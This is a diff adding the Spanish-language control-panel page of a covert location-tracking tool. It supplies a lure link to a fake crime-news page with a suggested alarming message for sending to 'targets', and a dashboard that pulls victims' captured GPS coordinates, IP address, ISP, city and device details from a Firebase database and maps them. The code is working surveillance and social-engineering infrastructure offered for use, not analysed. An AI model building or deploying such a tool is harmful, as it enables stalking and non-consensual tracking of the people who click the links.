@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🕵️‍♂️ Centro de Control - Espionaje</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            color: #ecf0f1;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            border: 2px solid #27ae60;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            color: #27ae60;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #27ae60;
+        }
+        
+        .section {
+            background: rgba(0,0,0,0.4);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border-left: 4px solid #3498db;
+        }
+        
+        .section h2 {
+            color: #3498db;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+        
+        .link-item {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255,255,255,0.2);
+            transition: all 0.3s ease;
+        }
+        
+        .link-item:hover {
+            background: rgba(255,255,255,0.2);
+            transform: translateX(5px);
+        }
+        
+        .link-title {
+            color: #f39c12;
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 1.1rem;
+        }
+        
+        .link-url {
+            background: #2c3e50;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 10px 0;
+            cursor: pointer;
+            border: 1px solid #34495e;
+        }
+        
+        .link-url:hover {
+            background: #34495e;
+        }
+        
+        .copy-btn {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-right: 10px;
+            font-size: 0.9rem;
+            transition: background 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #229954;
+        }
+        
+        .test-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: background 0.3s ease;
+        }
+        
+        .test-btn:hover {
+            background: #2980b9;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-item {
+            background: rgba(0,0,0,0.5);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            color: #bdc3c7;
+            margin-top: 5px;
+        }
+        
+        .captured-locations {
+            max-height: 400px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .location-item {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        .location-header {
+            color: #e74c3c;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        
+        .location-details {
+            font-size: 0.9rem;
+            color: #bdc3c7;
+            line-height: 1.4;
+        }
+        
+        .refresh-btn {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-bottom: 20px;
+            transition: background 0.3s ease;
+        }
+        
+        .refresh-btn:hover {
+            background: #c0392b;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #27ae60;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            z-index: 10000;
+            opacity: 0;
+            transform: translateX(100%);
+            transition: all 0.3s ease;
+        }
+        
+        .notification.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+        
+        .live-indicator {
+            color: #e74c3c;
+            animation: blink 1s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🕵️‍♂️ CENTRO DE CONTROL</h1>
+            <p>Sistema de Espionaje de Ubicaciones - <span class="live-indicator">● EN VIVO</span></p>
+        </div>
+        
+        <div class="section">
+            <h2>📊 ESTADÍSTICAS EN TIEMPO REAL</h2>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-number" id="totalCaptures">0</div>
+                    <div class="stat-label">Ubicaciones Capturadas</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="todayCaptures">0</div>
+                    <div class="stat-label">Capturas Hoy</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="averageAccuracy">0m</div>
+                    <div class="stat-label">Precisión Promedio</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="bestStrategy">-</div>
+                    <div class="stat-label">Mejor Estrategia</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>🎯 ENLACES PARA COMPARTIR</h2>
+            <p style="margin-bottom: 20px; color: #bdc3c7;">Copia estos enlaces y envíalos a tus objetivos:</p>
+            
+            <!-- ESTRATEGIA NOTICIAS -->
+            <div class="link-item">
+                <div class="link-title">📰 ESTRATEGIA NOTICIAS (Efectividad: 90%)</div>
+                <div class="link-url" onclick="copyToClipboard(this.textContent)" id="newsLink">Cargando...</div>
+                <button class="copy-btn" onclick="copyToClipboard(document.getElementById('newsLink').textContent)">📋 Copiar</button>
+                <button class="test-btn" onclick="testLink('news')">🧪 Probar</button>
+                <p style="color: #95a5a6; font-size: 0.9rem; margin-top: 8px;">Mensaje sugerido: "¿Viste esta noticia? Parece que está pasando algo grave en nuestra zona 😨"</p>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>📍 UBICACIONES CAPTURADAS</h2>
+            <button class="refresh-btn" onclick="refreshCaptures()">🔄 Actualizar</button>
+            <div class="captured-locations" id="capturedList">
+                <p style="color: #95a5a6; text-align: center; padding: 20px;">No hay capturas aún... ¡Envía los enlaces!</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="notification" id="notification"></div>
+    
+    <script>
+        // Variables globales
+        let baseUrl = '';
+        
+        // Inicializar
+        document.addEventListener('DOMContentLoaded', function() {
+            detectBaseUrl();
+            updateStats();
+            refreshCaptures();
+            
+            // Auto-refresh cada 10 segundos para detectar capturas de otros usuarios
+            let refreshInterval;
+            
+            function startAutoRefresh() {
+                if (refreshInterval) clearInterval(refreshInterval);
+                refreshInterval = setInterval(() => {
+                    console.log('🔄 Auto-refresh: Buscando nuevas ubicaciones compartidas...');
+                    refreshCaptures();
+                }, 10000);
+            }
+            
+            startAutoRefresh();
+            
+            // Refresh adicional cuando la ventana recibe foco
+            window.addEventListener('focus', () => {
+                console.log('👁️ Ventana enfocada: Refrescando inmediatamente...');
+                refreshCaptures();
+            });
+        });
+        
+        // Detectar URL base
+        function detectBaseUrl() {
+            const productionDomain = 'https://goodviv.vercel.app';
+            baseUrl = window.location.origin;
+
+            if (window.location.hostname.endsWith('.vercel.app') && window.location.origin !== productionDomain) {
+                baseUrl = productionDomain;
+            }
+            
+            // Actualizar enlace de noticias (con parámetro para mostrar noticia del crimen)
+            document.getElementById('newsLink').textContent = `${baseUrl}/news.html?mode=crime`;
+        }
+        
+        // Copiar al portapapeles
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification('✅ Enlace copiado al portapapeles');
+            }).catch(() => {
+                // Fallback
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showNotification('✅ Enlace copiado');
+            });
+        }
+        
+        // Probar enlace
+        function testLink(mode) {
+            if (mode === 'news') {
+                window.open(`${baseUrl}/news.html?mode=crime`, '_blank');
+            }
+        }
+        
+        // Mostrar notificación
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Actualizar estadísticas
+        function updateStats() {
+            const capturedLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+            
+            // Total capturas
+            document.getElementById('totalCaptures').textContent = capturedLocations.length;
+            
+            // Capturas hoy
+            const today = new Date().toDateString();
+            const todayCaptures = capturedLocations.filter(loc => 
+                new Date(loc.timestamp).toDateString() === today
+            ).length;
+            document.getElementById('todayCaptures').textContent = todayCaptures;
+            
+            // Precisión promedio
+            if (capturedLocations.length > 0) {
+                const avgAccuracy = capturedLocations.reduce((sum, loc) => sum + loc.accuracy, 0) / capturedLocations.length;
+                document.getElementById('averageAccuracy').textContent = Math.round(avgAccuracy) + 'm';
+            }
+            
+            // Mejor estrategia
+            const strategies = {};
+            capturedLocations.forEach(loc => {
+                strategies[loc.source] = (strategies[loc.source] || 0) + 1;
+            });
+            
+            const bestStrategy = Object.keys(strategies).reduce((a, b) => 
+                strategies[a] > strategies[b] ? a : b, '-'
+            );
+            
+            const shortName = {
+                'Diario Regional - Noticias': '📰 Noticias'
+            };
+            
+            document.getElementById('bestStrategy').textContent = shortName[bestStrategy] || bestStrategy;
+        }
+        
+        // Refrescar capturas con base de datos compartida
+        async function refreshCaptures() {
+            const container = document.getElementById('capturedList');
+            container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">🔄 Cargando ubicaciones compartidas...</p>';
+            
+            try {
+                // Usar Firebase Realtime Database público (más confiable)
+                const firebaseUrl = 'https://goodviv-spy-default-rtdb.firebaseio.com/locations.json';
+                
+                const response = await fetch(firebaseUrl);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const firebaseData = await response.json();
+                const sharedLocations = firebaseData ? Object.values(firebaseData) : [];
+                
+                // Obtener también datos locales
+                const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+                
+                // Combinar y eliminar duplicados
+                const allLocations = [...sharedLocations, ...localLocations];
+                
+                // Filtrar ubicaciones válidas (que tengan lat, lng y datos básicos)
+                const validLocations = allLocations.filter(location => 
+                    location && 
+                    typeof location.lat === 'number' && 
+                    typeof location.lng === 'number' && 
+                    location.source && 
+                    location.timestamp
+                );
+                
+                const uniqueLocations = validLocations.filter((location, index, self) => 
+                    index === self.findIndex(l => l.id === location.id)
+                );
+                
+                // Ordenar por timestamp más reciente
+                uniqueLocations.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                
+                console.log('📍 Total ubicaciones encontradas:', uniqueLocations.length);
+                console.log('🔥 Firebase:', sharedLocations.length, '💻 Locales:', localLocations.length);
+                
+                if (uniqueLocations.length === 0) {
+                    container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">No hay capturas aún... ¡Envía los enlaces!</p>';
+                    return;
+                }
+                
+                container.innerHTML = uniqueLocations.map(location => {
+                    // Determinar tipo de captura y color
+                    const isGPS = location.method === 'GPS_PRECISE';
+                    const isIP = location.method === 'IP_AUTOMATIC';
+                    const methodColor = isGPS ? '#27ae60' : '#f39c12';
+                    const methodIcon = isGPS ? '🎯' : '🌐';
+                    const methodText = isGPS ? 'GPS Exacto' : 'Ubicación IP';
+                    
+                    // Formatear precisión
+                    let precisionText = 'N/A';
+                    if (isGPS && location.accuracy) {
+                        precisionText = `±${Math.round(parseFloat(location.accuracy) || 0)}m`;
+                    } else if (isIP) {
+                        precisionText = location.accuracy || 'Ciudad/Región (~5-50km)';
+                    }
+                    
+                    // Información adicional
+                    let additionalInfo = '';
+                    if (isIP) {
+                        additionalInfo = `
+                            🏙️ <strong>Ciudad:</strong> ${location.city || 'N/A'}<br>
+                            🗺️ <strong>Región:</strong> ${location.region || 'N/A'}<br>
+                            🌍 <strong>País:</strong> ${location.country || 'N/A'}<br>
+                            🌐 <strong>IP:</strong> ${location.ip || 'N/A'}<br>
+                            📡 <strong>ISP:</strong> ${location.isp || 'N/A'}<br>
+                            🕒 <strong>Zona Horaria:</strong> ${location.timezone || 'N/A'}<br>
+                            🗣️ <strong>Idioma:</strong> ${location.language || 'N/A'}<br>
+                            📱 <strong>Pantalla:</strong> ${location.screenRes || 'N/A'}<br>
+                        `;
+                    } else if (isGPS) {
+                        additionalInfo = `
+                            ⛰️ <strong>Altitud:</strong> ${location.altitude || 'N/A'}<br>
+                            🧭 <strong>Dirección:</strong> ${location.heading || 'N/A'}<br>
+                            🏃 <strong>Velocidad:</strong> ${location.speed || 'N/A'}<br>
+                            🤖 <strong>Método:</strong> ${location.captureMethod || 'N/A'}<br>
+                            📱 <strong>Pantalla:</strong> ${location.screenRes || 'N/A'}<br>
+                        `;
+                    }
+                    
+                    return `
+                        <div class="location-item" style="border-left: 4px solid ${methodColor};">
+                            <div class="location-header">
+                                <span style="color: ${methodColor};">${methodIcon} ${methodText}</span>
+                                <span style="font-size: 0.8rem; color: #95a5a6; float: right;">${location.source || 'Diario Regional'}</span>
+                            </div>
+                            <div class="location-details">
+                                📍 <strong>Coordenadas:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}<br>
+                                🎯 <strong>Precisión:</strong> ${precisionText}<br>
+                                ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
+                                🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}<br>
+                                ${additionalInfo}
+                                <div style="margin-top: 15px; padding-top: 10px; border-top: 1px solid #34495e;">
+                                    <button onclick="openInGoogleMaps(${location.lat}, ${location.lng})" style="background: #3498db; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; margin-right: 8px; font-size: 0.85rem;">
+                                        🗺️ Ver en Mapa
+                                    </button>
+                                    <button onclick="copyToClipboard('${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}')" style="background: #27ae60; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 0.85rem;">
+                                        📋 Copiar Coordenadas
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+                
+                // Actualizar estadísticas con datos combinados
+                updateStatsWithSharedData(uniqueLocations);
+                
+            } catch (error) {
+                console.error('❌ Error cargando base de datos compartida:', error);
+                // Fallback a datos locales
+                const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+                
+                // Filtrar ubicaciones locales válidas
+                const validLocalLocations = localLocations.filter(location => 
+                    location && 
+                    typeof location.lat === 'number' && 
+                    typeof location.lng === 'number' && 
+                    location.source && 
+                    location.timestamp
+                );
+                
+                if (validLocalLocations.length === 0) {
+                    container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 20px;">❌ Error de conexión. Solo datos locales disponibles.</p>';
+                    return;
+                }
+                
+                container.innerHTML = validLocalLocations.map(location => `
+                    <div class="location-item">
+                        <div class="location-header">🎯 ${location.source || 'Fuente desconocida'} (Local)</div>
+                        <div class="location-details">
+                            📍 <strong>Coordenadas:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}<br>
+                            🎯 <strong>Precisión:</strong> ±${Math.round(location.accuracy || 0)}m<br>
+                            ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
+                            🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}
+                            <div style="margin-top: 10px;">
+                                <button onclick="openInGoogleMaps(${location.lat}, ${location.lng})" style="background: #3498db; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-right: 5px; font-size: 0.8rem;">
+                                    🗺️ Ver en Mapa
+                                </button>
+                                <button onclick="copyToClipboard('${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}')" style="background: #27ae60; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 0.8rem;">
+                                    📋 Copiar Coordenadas
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                `).join('');
+            }
+        }
+        
+        // Actualizar estadísticas con datos compartidos (IP + GPS)
+        function updateStatsWithSharedData(locations) {
+            // Separar por tipo de captura
+            const gpsCaptures = locations.filter(loc => loc.method === 'GPS_PRECISE');
+            const ipCaptures = locations.filter(loc => loc.method === 'IP_AUTOMATIC');
+            
+            // Total capturas con desglose
+            const totalText = `${locations.length} (🌐 ${ipCaptures.length} IP + 🎯 ${gpsCaptures.length} GPS)`;
+            document.getElementById('totalCaptures').textContent = totalText;
+            
+            // Capturas hoy con desglose
+            const today = new Date().toDateString();
+            const todayGPS = gpsCaptures.filter(loc => 
+                new Date(loc.timestamp).toDateString() === today
+            ).length;
+            const todayIP = ipCaptures.filter(loc => 
+                new Date(loc.timestamp).toDateString() === today
+            ).length;
+            const todayText = `${todayGPS + todayIP} (🌐 ${todayIP} IP + 🎯 ${todayGPS} GPS)`;
+            document.getElementById('todayCaptures').textContent = todayText;
+            
+            // Precisión promedio (solo para GPS)
+            if (gpsCaptures.length > 0) {
+                const avgAccuracy = gpsCaptures.reduce((sum, loc) => {
+                    const acc = parseFloat(loc.accuracy) || 0;
+                    return sum + acc;
+                }, 0) / gpsCaptures.length;
+                const precisionText = `${Math.round(avgAccuracy)}m GPS (${gpsCaptures.length} muestras)`;
+                document.getElementById('averageAccuracy').textContent = precisionText;
+            } else {
+                document.getElementById('averageAccuracy').textContent = 'Solo capturas IP (ciudad)';
+            }
+            
+            // Estrategia híbrida
+            const strategyText = ipCaptures.length > 0 && gpsCaptures.length > 0 
+                ? '🚀 Híbrida (IP + GPS)' 
+                : ipCaptures.length > 0 
+                    ? '🌐 Solo IP Automática'
+                    : '🎯 Solo GPS Manual';
+            
+            document.getElementById('bestStrategy').textContent = strategyText;
+        }
+        
+        // Abrir en Google Maps
+        function openInGoogleMaps(lat, lng) {
+            const url = `https://www.google.com/maps?q=${lat},${lng}`;
+            window.open(url, '_blank');
+        }
+    </script>
+    
+    <!-- Botón de diagnóstico -->
+    <div style="position: fixed; bottom: 20px; right: 20px; z-index: 1000;">
+        <button onclick="runDiagnostic()" style="background: #3498db; color: white; border: none; padding: 10px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.3);">
+            🔧 Diagnóstico
+        </button>
+    </div>
+    
+    <!-- Script de base de datos compartida -->
+    <script src="shared-database.js"></script>
+    
+    <script>
+        // Función de diagnóstico para el panel de control
+        function runDiagnostic() {
+            console.log('🔧 Ejecutando diagnóstico de ubicación...');
+            
+            const diagnosticInfo = {
+                navegador: navigator.userAgent,
+                geolocalizacionSoportada: !!navigator.geolocation,
+                protocolo: location.protocol,
+                dominio: location.hostname,
+                url: location.href,
+                leafletCargado: typeof L !== 'undefined'
+            };
+            
+            console.table(diagnosticInfo);
+            
+            // Verificar permisos
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                    console.log('🔐 Estado de permisos de ubicación:', result.state);
+                    
+                    alert(`🔧 DIAGNÓSTICO DEL PANEL DE CONTROL:
+
+✅ Geolocalización soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'SÍ' : 'NO'}
+🗺️ Mapa Leaflet cargado: ${diagnosticInfo.leafletCargado ? 'SÍ' : 'NO'}
+🔐 Permisos: ${result.state}
+🌐 Protocolo: ${diagnosticInfo.protocolo}
+🏠 Dominio: ${diagnosticInfo.dominio}
+
+${result.state === 'denied' ? 
+'⚠️ PROBLEMA: Permisos denegados. Haz clic en el candado 🔒 en la barra de direcciones y permite ubicación.' : 
+result.state === 'prompt' ? 
+'✅ Los permisos se solicitarán cuando sea necesario.' :
+'✅ Permisos concedidos.'}
+
+${diagnosticInfo.protocolo !== 'https:' && diagnosticInfo.dominio !== 'localhost' ? 
+'⚠️ RECOMENDACIÓN: Usa HTTPS para mejor funcionamiento.' : 
+'✅ Protocolo adecuado.'}
+                    `);
+                });
+            } else {
+                alert(`🔧 DIAGNÓSTICO DEL PANEL DE CONTROL:
+
+✅ Geolocalización soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'SÍ' : 'NO'}
+🗺️ Mapa Leaflet cargado: ${diagnosticInfo.leafletCargado ? 'SÍ' : 'NO'}
+🌐 Protocolo: ${diagnosticInfo.protocolo}
+🏠 Dominio: ${diagnosticInfo.dominio}
+
+${diagnosticInfo.protocolo !== 'https:' && diagnosticInfo.dominio !== 'localhost' ? 
+'⚠️ RECOMENDACIÓN: Usa HTTPS para mejor funcionamiento.' : 
+'✅ Protocolo adecuado.'}
+
+ℹ️ Tu navegador no permite verificar permisos automáticamente.
+                `);
+            }
+        }
+    </script>
+</body>
+</html>
